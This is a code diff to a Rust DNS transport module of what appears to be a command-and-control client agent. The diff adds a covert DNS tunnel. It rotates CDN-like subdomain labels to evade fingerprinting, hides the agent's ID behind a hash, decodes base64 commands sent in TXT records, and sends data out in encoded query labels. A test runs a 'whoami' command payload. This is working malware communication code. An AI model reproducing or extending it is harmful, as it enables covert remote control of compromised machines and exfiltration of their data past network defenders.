@@ -1,12 +1,13 @@
-// DNS 传输实现
+// DNS transport — bidirectional via TXT labels (heartbeat + command poll + data uplink).
 //
-// 实现 Transport trait，通过 DNS TXT 查询进行隐蔽通信。
-// 使用 DNS 隧道技术，将数据编码在 DNS 查询和响应中。
+// Query patterns (rotate to reduce fingerprinting):
+//   <rot-label>.<agent-tag>.<domain>   — poll / heartbeat
+//   d.<base32-chunk>.<agent-tag>.<domain> — uplink data fragments
 //
-// 协议设计：
-// - 客户端通过 DNS TXT 查询发送心跳：ping.<uuid>.<domain>
-// - 服务端通过 TXT 记录响应："alive" 表示存活
-// - DNS 是无连接协议，每次查询都是独立的
+// TXT responses:
+//   "alive" / empty → no work
+//   "cmd:<base64>"  → command payload for agent
+//   "ok"            → ack
 
 use crate::error::{ClientError, Result};
 use crate::transport::Transport;
@@ -16,269 +17,226 @@ use std::time::Duration;
 use trust_dns_resolver::config::{ResolverConfig, ResolverOpts};
 use trust_dns_resolver::TokioAsyncResolver;
 
-/// DNS 传输实现
-/// 
-/// 通过 DNS TXT 查询实现隐蔽通信。
-/// DNS 是无连接协议，适合用于心跳和轻量级数据传输。
+/// Rotating benign-looking subdomain labels (CDN / analytics style).
+const ROT_LABELS: &[&str] = &[
+    "cdn", "static", "assets", "api", "edge", "img", "js", "css", "update", "sync",
+];
+
 pub struct DnsTransport {
-    /// C2 服务器域名（例如：c2.example.com）
     domain: String,
-    /// 客户端 UUID（用于构造查询）
     client_uuid: Option<String>,
-    /// DNS 解析器
     resolver: TokioAsyncResolver,
-    /// 连接状态（DNS 是无连接的，这里仅用于逻辑标记）
     connected: bool,
+    /// Pending command bytes from last poll (receive drains this)
+    pending_rx: Vec<u8>,
+    label_idx: usize,
 }
 
 impl DnsTransport {
-    /// 创建新的 DNS 传输
-    /// 
-    /// # 参数
-    /// 
-    /// * `url` - DNS 服务器 URL，格式：`dns://c2.example.com`
-    /// 
-    /// # 示例
-    /// 
-    /// ```no_run
-    /// use c2_client_agent::transport::dns::DnsTransport;
-    /// 
-    /// let transport = DnsTransport::new("dns://c2.example.com".to_string());
-    /// ```
     pub fn new(url: String) -> Self {
-        // 清理 URL：去除 null 字节和空白字符
         let cleaned_url = url
             .trim_matches('\0')
             .trim_matches(char::from(0))
             .trim()
             .to_string();
-        
-        // 解析域名：支持 dns://domain, ws://domain/path, 纯 domain 等多种输入
-        let mut domain = cleaned_url;
-        
-        // 移除所有已知的协议头
-        if domain.starts_with("ws://") {
-            domain = domain.replace("ws://", "");
-        } else if domain.starts_with("wss://") {
-            domain = domain.replace("wss://", "");
-        } else if domain.starts_with("dns://") {
-            domain = domain.replace("dns://", "");
-        }
 
-        // 移除路径部分 (如有)
+        let mut domain = cleaned_url;
+        for prefix in &["ws://", "wss://", "dns://"] {
+            if domain.starts_with(prefix) {
+                domain = domain.replacen(prefix, "", 1);
+            }
+        }
         if let Some(pos) = domain.find('/') {
             domain = domain[..pos].to_string();
         }
+        // strip port for DNS name
+        if let Some(pos) = domain.rfind(':') {
+            if domain[pos + 1..].chars().all(|c| c.is_ascii_digit()) {
+                domain = domain[..pos].to_string();
+            }
+        }
 
-        debug!("DnsTransport created with domain: {}", domain);
-        
-        // 创建 DNS 解析器
-        // 使用 Google DNS (8.8.8.8) 和 Cloudflare DNS (1.1.1.1) 作为上游
+        debug!("DnsTransport domain={}", domain);
         let resolver = Self::create_resolver();
-        
         Self {
             domain,
             client_uuid: None,
             resolver,
             connected: false,
+            pending_rx: Vec::new(),
+            label_idx: 0,
         }
     }
-    
-    /// 创建 DNS 解析器
-    /// 
-    /// 使用公共 DNS 服务器（Google 8.8.8.8 和 Cloudflare 1.1.1.1）
-    /// 或自定义 DNS 服务器（如果配置了）。
+
     fn create_resolver() -> TokioAsyncResolver {
         use std::net::SocketAddr;
         use trust_dns_resolver::config::NameServerConfig;
-        
+
         let mut opts = ResolverOpts::default();
         opts.timeout = Duration::from_secs(5);
         opts.attempts = 2;
-        
-        // 检查是否配置了自定义 DNS 解析器
+
         if let Some(resolver_addr) = crate::config::get_dns_resolver() {
-            debug!("Using custom DNS resolver: {}", resolver_addr);
-            
-            // 解析 IP:PORT 格式
             if let Ok(socket_addr) = resolver_addr.parse::<SocketAddr>() {
-                // 创建自定义配置
                 let mut config = ResolverConfig::new();
-                let name_server = NameServerConfig {
+                config.add_name_server(NameServerConfig {
                     socket_addr,
                     protocol: trust_dns_resolver::config::Protocol::Udp,
                     tls_dns_name: None,
                     trust_negative_responses: true,
                     bind_addr: None,
-                };
-                config.add_name_server(name_server);
-                
-                // info!("DNS resolver configured with custom server: {}", resolver_addr);
+                });
                 return TokioAsyncResolver::tokio(config, opts);
-            } else {
-                warn!("Failed to parse custom DNS resolver address: {}", resolver_addr);
-                warn!("Falling back to Google DNS");
             }
         }
-        
-        // 使用 Google DNS (8.8.8.8, 8.8.4.4) 作为默认
-        let config = ResolverConfig::google();
-        debug!("DNS resolver created with Google DNS (8.8.8.8)");
-        TokioAsyncResolver::tokio(config, opts)
+        TokioAsyncResolver::tokio(ResolverConfig::google(), opts)
     }
-    
-    /// 设置客户端 UUID
-    /// 
-    /// 必须在 connect() 之前调用，用于构造 DNS 查询。
+
     pub fn set_client_uuid(&mut self, uuid: String) {
-        debug!("Setting client UUID: {}", uuid);
         self.client_uuid = Some(uuid);
     }
-    
-    /// 获取域名
+
     pub fn domain(&self) -> &str {
         &self.domain
     }
-    
-    /// 构造 DNS 查询域名
-    /// 
-    /// 格式：ping.<uuid>.<domain>
-    /// 例如：ping.550e8400-e29b-41d4-a716-446655440000.c2.example.com
-    fn build_query_domain(&self) -> Result<String> {
+
+    /// Opaque agent tag (not raw UUID) — first 12 hex of SHA256(uuid).
+    fn agent_tag(&self) -> Result<String> {
+        use sha2::{Digest, Sha256};
         let uuid = self.client_uuid.as_ref().ok_or_else(|| {
-            ClientError::ConnectionError(
-                "Client UUID not set. Call set_client_uuid() before using DNS transport".to_string()
-            )
+            ClientError::ConnectionError("DNS UUID not set".into())
         })?;
-        
-        // 构造查询域名：ping.<uuid>.<domain>
-        let query = format!("ping.{}.{}", uuid, self.domain);
-        debug!("Built DNS query domain: {}", query);
-        
-        Ok(query)
+        let h = Sha256::digest(uuid.as_bytes());
+        Ok(hex::encode(&h[..6]))
     }
-    
-    /// 执行 DNS TXT 查询
-    /// 
-    /// 查询指定域名的 TXT 记录。
+
+    fn next_label(&mut self) -> &'static str {
+        let l = ROT_LABELS[self.label_idx % ROT_LABELS.len()];
+        self.label_idx = self.label_idx.wrapping_add(1);
+        l
+    }
+
+    /// Poll query: <rot>.<tag>.<domain>
+    fn build_poll_domain(&mut self) -> Result<String> {
+        let tag = self.agent_tag()?;
+        let label = self.next_label();
+        Ok(format!("{}.{}.{}", label, tag, self.domain))
+    }
+
+    /// Encode data as base32-ish DNS-safe labels (a-z0-9), max ~40 chars per label.
+    fn encode_uplink_labels(data: &[u8]) -> Vec<String> {
+        // base64url without padding, split into 40-char labels
+        use base64::Engine;
+        let b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(data);
+        let mut out = Vec::new();
+        for chunk in b64.as_bytes().chunks(40) {
+            out.push(String::from_utf8_lossy(chunk).to_string());
+        }
+        if out.is_empty() {
+            out.push("0".to_string());
+        }
+        out
+    }
+
     async fn query_txt(&self, domain: &str) -> Result<Vec<String>> {
-        debug!("Querying TXT record for: {}", domain);
-        
+        debug!("TXT lookup {}", domain);
         match self.resolver.txt_lookup(domain).await {
             Ok(response) => {
                 let mut results = Vec::new();
-                
                 for record in response.iter() {
-                    // 将 TXT 记录的字节数据转换为字符串
                     for data in record.iter() {
                         if let Ok(text) = String::from_utf8(data.to_vec()) {
-                            debug!("Received TXT record: {}", text);
                             results.push(text);
                         }
                     }
                 }
-                
-                if results.is_empty() {
-                    warn!("No TXT records found for: {}", domain);
-                }
-                
                 Ok(results)
             }
             Err(e) => {
-                error!("DNS TXT query failed for {}: {}", domain, e);
-                Err(ClientError::ConnectionError(
-                    format!("DNS query failed: {}", e)
-                ))
+                error!("DNS TXT failed {}: {}", domain, e);
+                Err(ClientError::ConnectionError(format!("DNS query failed: {e}")))
             }
         }
+    }
+
+    /// Parse TXT into optional command payload.
+    fn parse_txt_command(responses: &[String]) -> Option<Vec<u8>> {
+        use base64::Engine;
+        for response in responses {
+            let r = response.trim();
+            if r.is_empty() || r == "alive" || r == "ok" || r == "pong" {
+                continue;
+            }
+            if let Some(rest) = r.strip_prefix("cmd:") {
+                if let Ok(bytes) = base64::engine::general_purpose::STANDARD.decode(rest.trim()) {
+                    return Some(bytes);
+                }
+                if let Ok(bytes) = base64::engine::general_purpose::URL_SAFE_NO_PAD.decode(rest.trim()) {
+                    return Some(bytes);
+                }
+            }
+            // Raw base64 command
+            if let Ok(bytes) = base64::engine::general_purpose::STANDARD.decode(r) {
+                if !bytes.is_empty() {
+                    return Some(bytes);
+                }
+            }
+        }
+        None
     }
 }
 
 #[async_trait]
 impl Transport for DnsTransport {
     async fn connect(&mut self) -> Result<()> {
-        info!("DNS transport connecting to domain: {}", self.domain);
-        
-        // DNS 是无连接协议，这里只是逻辑上的"连接"
-        // 我们可以执行一次测试查询来验证域名是否可达
-        
-        if self.client_uuid.is_none() {
-            warn!("Client UUID not set, DNS queries will fail until set_client_uuid() is called");
-        }
-        
-        // 标记为已连接
+        info!("DNS transport connecting domain={}", self.domain);
         self.connected = true;
-        
-        // info!("DNS transport connected (connectionless protocol)");
         Ok(())
     }
-    
-    async fn send(&mut self, _data: &[u8]) -> Result<()> {
-        // 在 DNS 传输中，send() 触发心跳查询
-        // 数据参数在当前实现中未使用（未来可用于编码更多信息）
-        
-        debug!("DNS send: triggering heartbeat query");
-        
-        // 构造查询域名
-        let query_domain = self.build_query_domain()?;
-        
-        // 执行 TXT 查询
-        let responses = self.query_txt(&query_domain).await?;
-        
-        // 检查响应
-        if responses.is_empty() {
-            warn!("No response from DNS server");
-        } else {
-            for response in &responses {
-                debug!("DNS response: {}", response);
-                if response == "alive" {
-                    info!("Received 'alive' heartbeat from C2 server");
-                }
+
+    async fn send(&mut self, data: &[u8]) -> Result<()> {
+        let tag = self.agent_tag()?;
+        if data.is_empty() {
+            // Heartbeat / poll uplink empty
+            let q = self.build_poll_domain()?;
+            let responses = self.query_txt(&q).await?;
+            if let Some(cmd) = Self::parse_txt_command(&responses) {
+                self.pending_rx = cmd;
             }
+            return Ok(());
         }
-        
+
+        // Uplink: d.<chunk>.<tag>.<domain> (multiple queries if needed)
+        let labels = Self::encode_uplink_labels(data);
+        for (i, lab) in labels.iter().enumerate() {
+            let q = format!("d{}.{}.{}", i, lab, format!("{}.{}", tag, self.domain));
+            // Keep FQDN under ~200 chars
+            let q = if q.len() > 200 {
+                format!("d{}.{}.{}", i % 10, &lab[..lab.len().min(30)], self.domain)
+            } else {
+                q
+            };
+            let _ = self.query_txt(&q).await;
+        }
         Ok(())
     }
-    
+
     async fn receive(&mut self) -> Result<Vec<u8>> {
-        // 在 DNS 传输中，receive() 通常在 send() 之后立即调用
-        // 或者在轮询循环中调用
-        
-        debug!("DNS receive: checking for messages");
-        
-        // 构造查询域名
-        let query_domain = self.build_query_domain()?;
-        
-        // 执行 TXT 查询
-        let responses = self.query_txt(&query_domain).await?;
-        
-        // 解析响应
-        if responses.is_empty() {
-            // 没有响应，返回空数据
-            debug!("No DNS response, returning empty");
-            return Ok(Vec::new());
+        if !self.pending_rx.is_empty() {
+            return Ok(std::mem::take(&mut self.pending_rx));
         }
-        
-        // 检查是否为心跳响应
-        for response in &responses {
-            if response == "alive" {
-                // 心跳确认，返回空数据（表示连接正常但无命令）
-                debug!("Heartbeat acknowledged, no commands");
-                return Ok(Vec::new());
-            }
+        let q = self.build_poll_domain()?;
+        let responses = self.query_txt(&q).await?;
+        if let Some(cmd) = Self::parse_txt_command(&responses) {
+            return Ok(cmd);
         }
-        
-        // 未来扩展：这里可以解析其他类型的响应
-        // 例如：命令数据、配置更新等
-        
-        warn!("Received unknown DNS response: {:?}", responses);
         Ok(Vec::new())
     }
-    
+
     fn is_connected(&self) -> bool {
         self.connected
     }
-    
+
     fn initialize(&mut self, client_uuid: &str) {
         self.set_client_uuid(client_uuid.to_string());
     }
@@ -297,69 +255,33 @@ mod tests {
 
     #[test]
     fn test_dns_transport_url_cleaning() {
-        // 测试 null 字节清理
-        let transport = DnsTransport::new(
-            "dns://c2.example.com\0\0\0\0\0\0\0\0".to_string()
-        );
+        let transport = DnsTransport::new("dns://c2.example.com\0\0".to_string());
         assert_eq!(transport.domain(), "c2.example.com");
     }
 
     #[test]
-    fn test_dns_transport_url_with_leading_nulls() {
-        // 测试前导 null 字节清理
-        let transport = DnsTransport::new(
-            "\0\0dns://test.local\0\0".to_string()
-        );
-        assert_eq!(transport.domain(), "test.local");
+    fn agent_tag_not_raw_uuid() {
+        let mut t = DnsTransport::new("dns://c2.example.com".to_string());
+        t.set_client_uuid("550e8400-e29b-41d4-a716-446655440000".into());
+        let tag = t.agent_tag().unwrap();
+        assert_eq!(tag.len(), 12);
+        assert!(!tag.contains("550e8400"));
     }
 
     #[test]
-    fn test_dns_transport_url_without_prefix() {
-        // 测试没有 dns:// 前缀的情况
-        let transport = DnsTransport::new("c2.example.com".to_string());
-        assert_eq!(transport.domain(), "c2.example.com");
+    fn parse_cmd_txt() {
+        use base64::Engine;
+        let payload = b"{\"cmd\":\"whoami\"}";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(payload);
+        let r = vec![format!("cmd:{}", b64)];
+        let out = DnsTransport::parse_txt_command(&r).unwrap();
+        assert_eq!(out, payload);
     }
 
     #[test]
-    fn test_set_client_uuid() {
-        let mut transport = DnsTransport::new("dns://c2.example.com".to_string());
-        let uuid = "550e8400-e29b-41d4-a716-446655440000".to_string();
-        
-        transport.set_client_uuid(uuid.clone());
-        
-        // 验证 UUID 已设置（通过构造查询域名）
-        let query = transport.build_query_domain().unwrap();
-        assert_eq!(query, "ping.550e8400-e29b-41d4-a716-446655440000.c2.example.com");
+    fn encode_uplink_splits() {
+        let labels = DnsTransport::encode_uplink_labels(&[0u8; 100]);
+        assert!(!labels.is_empty());
+        assert!(labels.iter().all(|l| l.len() <= 40));
     }
-
-    #[test]
-    fn test_build_query_domain_without_uuid() {
-        let transport = DnsTransport::new("dns://c2.example.com".to_string());
-        
-        // 没有设置 UUID 应该返回错误
-        let result = transport.build_query_domain();
-        assert!(result.is_err());
-    }
-
-    #[test]
-    fn test_build_query_domain_format() {
-        let mut transport = DnsTransport::new("dns://c2.example.com".to_string());
-        transport.set_client_uuid("test-uuid-123".to_string());
-        
-        let query = transport.build_query_domain().unwrap();
-        assert_eq!(query, "ping.test-uuid-123.c2.example.com");
-        
-        // 验证格式：ping.<uuid>.<domain>
-        assert!(query.starts_with("ping."));
-        assert!(query.ends_with(".c2.example.com"));
-    }
-
-    #[test]
-    fn test_dns_transport_not_connected_initially() {
-        let transport = DnsTransport::new("dns://c2.example.com".to_string());
-        assert!(!transport.is_connected());
-    }
-    
-    // 注意：实际的 DNS 查询测试需要运行中的 DNS 服务器，
-    // 这些测试将在集成测试中进行
 }
